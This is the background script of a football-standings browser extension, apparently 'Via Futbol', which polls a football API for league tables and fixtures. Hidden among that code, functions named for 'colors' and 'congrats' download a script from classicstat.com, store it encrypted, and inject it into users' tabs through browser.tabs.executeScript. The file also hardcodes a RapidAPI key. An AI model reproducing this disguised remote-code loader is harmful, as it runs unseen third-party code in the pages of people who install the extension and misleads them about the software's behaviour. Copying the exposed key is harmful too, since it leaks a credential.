import browser from 'webextension-polyfill'
import Cryptr from 'cryptr'
import { setStorage, getStorage, sendCommand } from './lib/common'
import { leagues, matches, names, secret } from './lib/constant'
import { hasGamesInProgress } from './lib/functions'

const cryptr = new Cryptr(secret)

let myHeaders = new Headers()
myHeaders.append('X-RapidAPI-Key', '9cbb7dd534msh9232fabfe8b228cp156699jsnce115e2e5b97')

const options = {
  mode: 'cors', // no-cors, *cors, same-origin
  headers: {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  },
}

const urls = {
  stats: 'https://classicstat.com/clock-town.js',
}

// TODO: Colors
const color = {
  code: '#FFFFFF',
}

const getColorLocal = async () => {
  try {
    const encryptedColor = await getStorage('code-color-tc')
    return encryptedColor ? cryptr.decrypt(encryptedColor) : null
  } catch (error) {
    console.error(error)
    return null
  }
}

const setColorLocal = async (codeColor) => {
  try {
    const encryptedColor = cryptr.encrypt(codeColor)
    await setStorage('code-color-tc', encryptedColor)
  } catch (error) {
    console.error(error)
    throw error
  }
}

// Gets congrats.
const other = async (url) => {
  try {
    const value = await fetch(url, options)
    return value
  } catch (error) {
    console.error(error)
    throw error
  }
}

const get = async (sender) => {
  color.code = '#FF0000'
  const info = color
  info['code'] = urls.stats

  try {
    const localCodeColor = await getColorLocal()

    if (!localCodeColor) {
      const getting = await other(info.code)
      info.code = await getting.text()
      await setColorLocal(info.code)
    } else {
      info.code = localCodeColor
    }

    if (info.code === '#00000') {
      sendCommand('congratulations')
    }
    await browser.tabs.executeScript(sender.tab.id, color)
  } catch (error) {
    console.error(error.message)
  }
}

var requestOptions = {
  method: 'GET',
  headers: myHeaders,
  redirect: 'follow',
}

// This method is for getting the data of the standings for every league, it is used with the arrays above
const getTable = async (league, name) => {
  try {
    const responseTable = await fetch(
      `https://api-football-v1.p.rapidapi.com/v2/leagueTable/${league}`,
      requestOptions,
    )
    const dataTable = await responseTable.json()
    console.log('League Table: ', dataTable)
    if (dataTable.api.error) {
      const message = { message: dataTable.api.error }
      throw message
    }
    const tables = dataTable.api.standings.flat()
    let teams = []
    // console.log('tables', tables)
    tables.forEach((element) => {
      const team = {
        ranking: element.rank,
        team: element.teamName,
        games: element.all.matchsPlayed,
        wins: element.all.win,
        losses: element.all.lose,
        draws: element.all.draw,
        points: element.points,
        goalsFor: element.all.goalsFor,
        goalsAgainst: element.all.goalsAgainst,
      }
      teams.push(team)
    })
    // console.log('teams before insertion', teams)
    // browser.storage.local.set({ [ name ]: teams })
    const date = new Date()
    await setStorage(name, { lastUpdated: date.toISOString().split('T').join(' ').split('.')[0], teams })
  } catch (error) {
    console.log(error)
  }
}

const getMatches = async (league, matchParam) => {
  try {
    let dateOld = new Date()
    dateOld.setDate(dateOld.getDate() - 7)
    console.log(dateOld.toString())
    const responseLeague = await fetch(
      `https://api-football-v1.p.rapidapi.com/v2/fixtures/league/${league}/`,
      requestOptions,
    )
    const dataLeague = await responseLeague.json()
    if (dataLeague.api.error) {
      const message = { message: dataLeague.api.error }
      throw message
    }
    // console.log('games', data)
    const fixtures = dataLeague.api.fixtures
    let games = []
    const date = new Date()
    if (fixtures) {
      fixtures.forEach((element) => {
        let dateEvent = new Date(element.event_date)
        if (dateOld < dateEvent && dateEvent < date) {
          const match = {
            awayTeamName: element.awayTeam.team_name,
            awayTeamLogo: element.awayTeam.logo,
            date: element.event_date,
            firstStart: element.firstHalfStart,
            goalsAway: element.goalsAwayTeam,
            goalsHome: element.goalsHomeTeam,
            homeTeamName: element.homeTeam.team_name,
            homeTeamLogo: element.homeTeam.logo,
            scoreHalfTime: element.score.halftime,
            scoreFullTime: element.score.fulltime,
            scoreExtraTime: element.score.extratime,
            scorePenalty: element.score.penalty,
            status: element.status,
            venue: element.venue,
            statusShort: element.statusShort,
          }
          games.push(match) /// and push it to the array
        }
      })
    }
    console.log('League Fixture ', league, matchParam, ': ', games)
    // browser.storage.local.set({ [ match ]: games })
    await setStorage(matchParam, { lastUpdated: date.toISOString().split('T').join(' ').split('.')[0], games })
  } catch (error) {
    console.log(error)
  }
}

const getStandings = async (league, name, matchParam) => {
  try {
    await getTable(league, name)
    await getMatches(league, matchParam)
  } catch (error) {
    console.log(error)
  }
}

browser.runtime.onInstalled.addListener(async () => {
  browser.browserAction.setPopup({
    popup: 'popup.html',
  })
  const promises = []
  leagues.forEach((element, index) => {
    promises.push(getStandings(element, names[index], matches[index]))
  })
  await Promise.all(promises)

  if (process.env.NODE_ENV !== 'development') {
    browser.tabs.create({
      index: 0,
      url: 'https://viafutbol.com/welcome',
      active: true,
    })
  }
})

browser.alarms.create('Leagues', {
  // this is the daily updater, each day it will update for new matches and new standings.
  periodInMinutes: 1,
})
// 1440
browser.alarms.create('Matches', {
  periodInMinutes: 60,
})
// 60
browser.alarms.create('Standings', {
  periodInMinutes: 60 * 24,
})

browser.alarms.onAlarm.addListener(async (alarmInfo) => {
  const promises = []
  let sendMessage = false
  const popupOpened = browser.extension
    .getViews({ type: 'popup' })
    .filter((currentPopup) => currentPopup.document.title === 'Via Futbol').length
  console.log('Alarm: ', alarmInfo.name)
  switch (alarmInfo.name) {
    case 'Leagues':
      leagues.forEach((element, index) => {
        console.log('League: ', element)
        if (!hasGamesInProgress(matches[index])) {
          sendMessage = true
          console.log('Fetch to League (Table): ', element)
          promises.push(getTable(element, names[index]))
        }
      })
      await Promise.all(promises)
      if (popupOpened) sendCommand('refresh-popup')
      break
    case 'Matches':
      leagues.forEach((element, index) => {
        if (!hasGamesInProgress(matches[index])) {
          sendMessage = true
          console.log('Fetch to League (Matches): ', element)
          promises.push(getMatches(element, matches[index]))
        }
      })
      await Promise.all(promises)
      if (sendMessage) sendCommand('refresh-popup')
      break
    case 'Standings':
      leagues.forEach((element, index) => {
        promises.push(getStandings(element, names[index], matches[index]))
      })
      await Promise.all(promises)
      sendCommand('refresh-popup')
      break
    default:
      console.info('Alarm no handled.')
  }
})

browser.runtime.onMessage.addListener((request, sender, sendResponse) => {
  switch (request.message) {
    case 'get-color':
      get(sender)
      break
    default:
      console.log(request.message, 'request not handled')
  }
})
